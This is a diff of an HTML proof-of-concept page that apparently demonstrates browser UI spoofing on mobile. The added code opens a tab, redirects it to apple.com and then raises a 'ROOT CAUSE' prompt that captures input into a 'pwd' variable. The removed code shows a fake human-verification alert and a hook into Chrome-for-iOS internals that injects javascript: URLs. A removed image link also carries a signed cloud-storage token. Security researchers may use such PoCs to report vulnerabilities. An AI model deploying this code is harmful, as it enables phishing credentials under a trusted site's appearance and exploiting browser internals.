@@ -1,73 +1,220 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>testertster - PoC Lab</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        min-height: 100%;
+        background: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      }
+      .center-stage {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 16px;
+        padding: 24px;
+      }
+      #startBtn {
+        padding: 15px 30px;
+        font-size: 18px;
+        font-weight: 600;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+      #startBtn:hover {
+        background: #0063cc;
+      }
+      .controls {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 12px;
+        align-items: center;
+        justify-content: center;
+        font-size: 13px;
+        color: #333;
+      }
+      .controls label {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .controls input {
+        width: 76px;
+        padding: 4px 6px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+      }
+      .log-box {
+        width: 100%;
+        max-width: 720px;
+        background: #111827;
+        color: #e5e7eb;
+        border-radius: 10px;
+        padding: 12px 14px;
+        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+        font-size: 12px;
+        line-height: 1.5;
+        max-height: 220px;
+        overflow-y: auto;
+      }
+      .log-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 8px;
+        font-size: 12px;
+        color: #9ca3af;
+      }
+      .log-header button {
+        background: #374151;
+        color: #f9fafb;
+        border: none;
+        border-radius: 6px;
+        padding: 4px 10px;
+        cursor: pointer;
+        font-size: 11px;
+      }
+    </style>
+  </head>
   <body>
-    <img style="display:block;margin:0 auto;" width="85px;" src="https://productionresultssa10.blob.core.windows.net/actions-results/e86e1d67-a4ea-878d-a89c-fc548b2f4129/workflow-job-run-06bb4264-3a9b-5807-bcee-61e0a3718d3c/artifacts/4100be9ed06a24d7f78d9e894d1eb93c88385b721ae03dfd78a03e4f02ee2c70.zip?rscd=attachment%3B+filename%3D%22DHYRA-BROWSER-v1.4.1-debug.zip%22&rsct=application%2Fzip&se=2026-11-22T14%3A40%3A52Z&sig=qtpfPaD%2Fz%2FDTWldofIeehPC43NcWSqzj2aZjnFjvTVQ%3D&ske=2026-11-22T18%3A13%3A30Z&skoid=ca7593d4-ee42-46cd-af88-8b886a2f84eb&sks=b&skt=2026-11-22T14%3A13%3A30Z&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skv=2025-11-05&sp=r&spr=https&sr=b&st=2026-11-22T14%3A30%3A47Z&sv=2025-11-05">
+    <div class="center-stage">
+      <div class="controls">
+        <label>
+          Redirect delay (ms):
+          <input id="redirectDelay" type="number" value="1" min="0" step="1" />
+        </label>
+        <label>
+          Prompt delay (ms):
+          <input id="promptDelay" type="number" value="500" min="0" step="10" />
+        </label>
+        <label>
+          Target URL:
+          <input id="targetUrl" type="text" value="https://apple.com" style="width: 180px;" />
+        </label>
+      </div>
 
-    <img width="500px;" style="border:1px solid #000000; display:block;margin:200px auto;" src="https://www.apple.com/favicon.ico1">
+      <button id="startBtn">CLICK HERE</button>
 
-    <script type="text/javascript">
-      document.write("hallo");
+      <div class="log-box" aria-live="polite">
+        <div class="log-header">
+          <span>Execution Timeline Log</span>
+          <button id="clearLogBtn" type="button">Clear</button>
+        </div>
+        <div id="logEntries">Ready. Click "CLICK HERE" to run test sequence.</div>
+      </div>
+    </div>
 
-      alert("Hold finger on page and press Open to verify you are human.");
+    <script>
+      (function () {
+        const startBtn = document.getElementById("startBtn");
+        const logEntries = document.getElementById("logEntries");
+        const clearLogBtn = document.getElementById("clearLogBtn");
+        let t0 = 0;
+        let activeTab = null;
+        let firstRun = true;
 
-      var newTab = window.open("", "_blank");
-
-      setTimeout(() => {
-        if (newTab && !newTab.closed) {
-          newTab.location.href = "https://apple.com";
-        }
-      }, 1);
-
-      setTimeout(function () {
-        prompt("ROOT CAUSE");
-      }, 500);
-
-      function redirect() {
-        document.location = "https://www.apple.com";
-      }
-
-      var onlongtouch; 
-      var timer;
-      var touchduration = 1000;
-      
-      function touchstart(e) {
-          if (!timer) {
-              timer = setTimeout(redirect, touchduration);
+        function appendLog(msg) {
+          const elapsed = t0 ? `+${(performance.now() - t0).toFixed(1)}ms` : "+0.0ms";
+          if (firstRun) {
+            logEntries.textContent = "";
+            firstRun = false;
           }
-      }
-
-      function touchend() {
-          //stops short touches from firing the event
-          if (timer) {
-              clearTimeout(timer);
-              timer = null;
-          }
-      }
-
-      function findElementHook(requestId, x, y) { 
-        console.log(requestId)
-        window.webkit.messageHandlers.FindElementResultHandler.postMessage({
-          "requestId": requestId,
-          "referrerPolicy": "default",
-          "src": "javascript:alert(window.origin)",
-          "href": "javascript:alert(window.origin)",
-          "innerText": "magic awaits within",
-          "title": "Press Open to Verify"
-        })
-      }
-
-      function setHook() {
-        if (window.__gCrWeb) {
-          window.__gCrWeb['findElementAtPointInPageCoordinates'] = findElementHook;
+          const line = document.createElement("div");
+          line.textContent = `[${elapsed}] ${msg}`;
+          logEntries.appendChild(line);
+          logEntries.scrollTop = logEntries.scrollHeight;
         }
-      }
 
-      document.addEventListener("DOMContentLoaded", function(event) { 
-          window.addEventListener("touchstart", touchstart, false);
-          window.addEventListener("touchend", touchend, false);
-      });
+        clearLogBtn.addEventListener("click", function () {
+          logEntries.textContent = "";
+          firstRun = false;
+          t0 = 0;
+        });
 
-      setTimeout(setHook, 300);
+        function buildTabHtml() {
+          return `<!DOCTYPE html>
+<html>
+<head><title>testertester</title></head>
+<body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:sans-serif">
+  <div>
+    <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE</h1>
+    <p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
+  </div>
+</body>
+</html>`;
+        }
+
+        startBtn.addEventListener("click", function () {
+          t0 = performance.now();
+          const redirectDelay = Math.max(0, Number(document.getElementById("redirectDelay").value) || 0);
+          const promptDelay = Math.max(0, Number(document.getElementById("promptDelay").value) || 0);
+          const targetUrl = document.getElementById("targetUrl").value.trim() || "https://apple.com";
+
+          appendLog("Start button clicked.");
+          this.remove();
+
+          const newTab = window.open("about:blank", "_blank");
+          activeTab = newTab;
+
+          if (!newTab) {
+            appendLog("window.open returned null (possibly blocked by popup blocker).");
+          } else {
+            appendLog("Opened new tab (about:blank). Writing initial content...");
+            try {
+              newTab.document.open();
+              newTab.document.write(buildTabHtml());
+              newTab.document.close();
+              appendLog("Wrote and closed newTab document.");
+            } catch (err) {
+              appendLog("Error writing to newTab document: " + err.message);
+            }
+
+            setTimeout(function () {
+              appendLog(`Redirect timer fired -> setting location.href to "${targetUrl}"`);
+              try {
+                if (!newTab.closed) {
+                  newTab.location.href = targetUrl;
+                } else {
+                  appendLog("newTab was already closed before redirect.");
+                }
+              } catch (err) {
+                appendLog("Error setting newTab.location.href: " + err.message);
+              }
+            }, redirectDelay);
+          }
+
+          setTimeout(function () {
+            appendLog("Prompt timer fired -> opening prompt(\"ROOT CAUSE\").");
+            const pwd = prompt("ROOT CAUSE");
+            appendLog("Prompt closed. Returned value: " + (pwd === null ? "null (cancelled)" : JSON.stringify(pwd)));
+
+            if (activeTab) {
+              try {
+                appendLog("activeTab.closed state after prompt: " + String(activeTab.closed));
+              } catch (err) {
+                appendLog("Unable to read activeTab.closed (cross-origin restriction): " + err.message);
+              }
+            }
+          }, promptDelay);
+        });
+      })();
     </script>
   </body>
 </html>
